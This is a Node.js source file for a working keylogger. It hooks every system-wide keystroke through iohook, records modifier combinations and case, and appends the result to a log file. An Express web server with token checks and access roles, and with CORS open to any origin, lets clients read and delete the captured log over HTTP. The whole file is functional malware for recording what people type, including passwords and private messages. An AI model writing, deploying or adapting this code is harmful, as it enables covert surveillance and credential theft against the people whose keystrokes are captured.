const iohook = require('iohook');
const express = require('express');
const bodyParser = require('body-parser');
const config = require('./config');
const AccessControl = require('accesscontrol');
const ac = new AccessControl(config.grants);
const fs = require('fs');
const path = require('path');
const app = express();
const errorHandler = require('./_helpers/error-handler');
const verifyToken = require('./users/verifyToken');


const Keymap = config.Keymap;
const SpecialCharacter = config.SpecialCharacter;
fs.appendFile(config.dir + '/data.log', '\n' + ((Date()).toString()) + '\n', function (err) {
    if (err) throw err;
});
ac.grant('superuser').extend('admin');

let toggle = false;

app.use(express.static('dist'));
app.use(bodyParser.json());
app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept,Authorization");
    next();
});
app.use('/users', require('./users/users.controller'));
app.use(errorHandler);

app.get('/', function (req, res, next) {
    res.sendFile(path.join(__dirname, './dist/index.html'));
});

app.post('/', verifyToken, function (req, res) {
    const permission = ac.can(req.roles).readAny('data');
    if(permission.granted) {
            fs.readFile(config.dir + '/data.log', (err, data) => {
                if (err) {
                    return res.status(400).send({ message: err.toString() });
                };
                return res.status(200).send({ message: data.toString() });
            })
        
    }
    else {
        return res.status(403).send({message: 'Access Denied!' });
    }
})

app.post('/delete', verifyToken, function (req, res) {
    const permission = ac.can(req.roles).deleteAny('data');
    if(permission.granted) {
            fs.unlink(config.dir + '/data.log', (err) => {
                if (err) {
                    return res.status(400).send({ message: err.toString() })
                };
                return res.status(200).send({ message: "Deleted Successfully" });
            })
        
    }
    else {
        return res.status(403).send({message: 'Access Denied!' });
    }
})

function interpret(event) {

    if (event.rawcode == 20) {
        toggle = !toggle;
    }
    else {
        if (event.rawcode in Keymap) {
            let i = Keymap[event.rawcode];
            if (event.altKey || event.ctrlKey || event.metaKey) {
                if (event.shiftKey)
                    i = "SHIFT+" + i;
                if (event.altKey)
                    i = "ALT+" + i;
                if (event.metaKey)
                    i = "WIN+" + i;
                if (event.ctrlKey)
                    i = "CTRL+" + i;
            }
            else if (event.shiftKey && (i in SpecialCharacter)) {
                i = SpecialCharacter[i]
            }
            else if (toggle ^ event.shiftKey) {
                i = i.toUpperCase();
            }

            if (i) {
                if (i.length > 1) {
                    i = (`#[ ${i} ]#`);
                }
                fs.appendFile(config.dir + '/data.log', i, function (err) {
                    if (err) throw err;
                });
            }
        }
    }
}

iohook.on('keydown', interpret);

iohook.start();

const port = process.env.PORT || 4000;
app.listen(port, () => console.log(`Listening to port ${port}...\nvisit http://localhost:${port} in the browser to view the contents of the log file`));
